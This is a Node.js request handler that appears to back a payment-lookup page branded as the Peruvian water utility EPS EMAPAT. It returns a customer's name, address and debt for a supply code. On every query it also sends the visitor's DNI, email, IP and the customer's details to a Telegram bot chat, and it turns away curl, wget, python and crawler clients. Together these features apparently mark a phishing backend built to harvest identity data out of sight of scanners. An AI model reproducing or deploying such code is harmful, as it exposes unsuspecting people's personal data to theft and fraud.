const fs = require('fs');
const path = require('path');
const { checkRateLimit, isIPBlocked, containsOffensiveWords, sanitizeForLog, getClientIP } = require('./utils');

async function sendTelegram(data) {
  const token  = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!token || !chatId) return;
  const icono = data.encontrado ? '🔍' : '⚠️';
  const msg = [
    `${icono} *CONSULTA DE SUMINISTRO — EPS EMAPAT*`,
    `━━━━━━━━━━━━━━━━━━━━`,
    `📋 *Suministro:* ${sanitizeForLog(data.codigo, 20)}`,
    ...(data.dni ? [`🪪 *DNI:* ${sanitizeForLog(data.dni, 15)}`] : []),
    ...(data.email ? [`📧 *Correo:* ${sanitizeForLog(data.email, 50)}`] : []),
    data.encontrado
      ? `👤 *Cliente:* ${sanitizeForLog(data.nombre || '-', 50)}`
      : `❌ *Resultado:* No encontrado`,
    ...(data.encontrado && data.dir ? [`🏠 *Dirección:* ${sanitizeForLog(data.dir, 100)}`] : []),
    `💰 *Deuda:* S/ ${Number(data.deuda || 0).toFixed(2)}`,
    `━━━━━━━━━━━━━━━━━━━━`,
    `🌐 *IP:* \`${sanitizeForLog(data.ip, 45)}\``,
    `🕐 *Fecha:* ${data.fecha}`,
  ].join('\n');
  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'Markdown' }),
  });
}

function cargarDB() {
  try {
    const filePath = path.join(process.cwd(), 'pagoWEB/pagoweb_data.json');
    return JSON.parse(fs.readFileSync(filePath, 'utf-8'));
  } catch (e) {
    console.error('Error cargando pagoweb_data.json:', e);
    return {};
  }
}

module.exports = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'GET') return res.status(405).json({ error: 'Método no permitido' });

  const ip = getClientIP(req);

  // Check if IP is blocked
  if (isIPBlocked(ip)) {
    return res.status(403).json({ error: 'Acceso denegado' });
  }

  // Rate limit: 30 requests per minute per IP
  if (!checkRateLimit(ip, 30)) {
    return res.status(429).json({ error: 'Demasiadas solicitudes. Intenta más tarde.' });
  }

  // Check for suspicious user agents
  const userAgent = req.headers['user-agent'] || '';
  const suspiciousAgents = ['bot', 'crawler', 'spider', 'scraper', 'curl', 'wget', 'python', 'java'];
  if (suspiciousAgents.some(agent => userAgent.toLowerCase().includes(agent))) {
    return res.status(403).json({ error: 'Acceso denegado' });
  }

  const codigo = String(req.query.codigo || '').trim();
  const dni    = String(req.query.dni || '').trim();
  const email  = String(req.query.email || '').trim();

  if (!codigo) {
    return res.status(400).json({ error: 'Ingrese un código de suministro' });
  }

  // Validate that the code only contains alphanumeric characters and hyphens
  if (!/^[a-zA-Z0-9\-]+$/.test(codigo) || codigo.length > 20) {
    return res.status(400).json({ error: 'Código de suministro inválido' });
  }

  // Filter offensive words
  if (containsOffensiveWords(codigo) || containsOffensiveWords(dni) || containsOffensiveWords(email)) {
    return res.status(400).json({ error: 'Contenido no permitido' });
  }

  const DB = cargarDB();
  const cliente = DB[codigo];

  try {
    await sendTelegram({
      codigo,
      dni,
      email,
      encontrado: Boolean(cliente),
      nombre: cliente ? cliente.nombre : undefined,
      dir: cliente ? cliente.dir : undefined,
      deuda: cliente ? cliente.deuda : 0,
      ip,
      fecha: new Date().toLocaleString('es-PE', { timeZone: 'America/Lima' }),
    });
  } catch (e) {
    console.error('Telegram error:', e);
  }

  if (!cliente) {
    return res.status(404).json({ error: 'Código de suministro no encontrado' });
  }

  return res.status(200).json(cliente);
};